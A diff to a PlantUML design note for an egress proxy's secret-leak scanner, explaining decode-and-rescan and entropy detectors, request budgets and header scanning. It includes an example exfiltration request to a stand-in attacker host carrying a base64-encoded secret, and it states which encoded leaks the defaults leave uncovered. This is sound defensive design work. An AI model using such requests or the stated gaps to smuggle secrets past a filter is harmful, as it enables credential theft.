@@ -47,6 +47,49 @@ end note
 note bottom of C
 Scans URL path+query and body. Blocks (default)
 or redacts. Closes ""GET ?key=secret"" that A misses.
+
+**Two detectors, deliberately asymmetric.** //Decode-and-rescan//
+(""DecodeScan"", default ON) is the primary encoding-evasion defense:
+base64/hex runs in the URL or body are decoded one level and re-checked
+against the exact-value and credential-shape matchers. It fires only on
+a token that decodes to an //actual// secret, so it costs almost no false
+positives. //Entropy// (""BlockEntropy"", default OFF) is the opt-in
+backstop that also catches an encoded UNKNOWN blob, at the price of
+false-positives on legitimately high-entropy URLs — presigned links,
+JWTs. See F1/F2 in ""_spec/_conventions/design-decision-ids\.puml"" for
+the finding these answer.
+
+**Why exact-match alone was not enough.** Before decode-and-rescan the
+only content gates were exact values and shape regexes, which base64
+defeats trivially, and a budget that ignored the URL path — so
+""GET https://attacker/<base64(secret)>"" left unbounded. The budget now
+charges the **whole request-target, path AND query, plus body**, so data
+smuggled in a path is bounded like any other exfil.
+
+**Residual, stated rather than hidden:** with both detectors off, an
+encoded unknown blob is bounded only by the byte budget. Decode-scan
+closes the known-secret case cheaply; entropy is what covers unknown
+blobs, and it is off by default on purpose.
+
+**Decoding is bounded too.** Candidate runs carry minimum lengths so
+every short word is not decoded (base64 of an 8-byte secret is ~11–12
+chars, hex is 2× the bytes), runs are extracted per-encoding so URL
+delimiters do not glue two tokens into one unparseable run, and a
+decoding that is too short or clearly binary is dropped unscanned — a
+benign random signature decodes to non-text bytes and must not become a
+false positive.
+
+**Body scanning is memory-bounded, and the sidecar's memory limit
+follows from it.** At most ""maxBodyScan"" (~1 MiB) is read for the scan
+and an equivalent body is reattached that streams the untouched
+remainder, so proxy memory stays flat regardless of upload size. That
+bound is why the egress-proxy container's cap can be small; raise one
+and the other has to move with it.
+
+**Headers are scanned as well as stripped.** The broker strips a fixed
+set of header //names// off-provider; the scan catches a secret smuggled
+in any other header, which is also what covers the multi-provider case
+where a second provider's key rides a header the strip list never named.
 end note
 
 @enduml
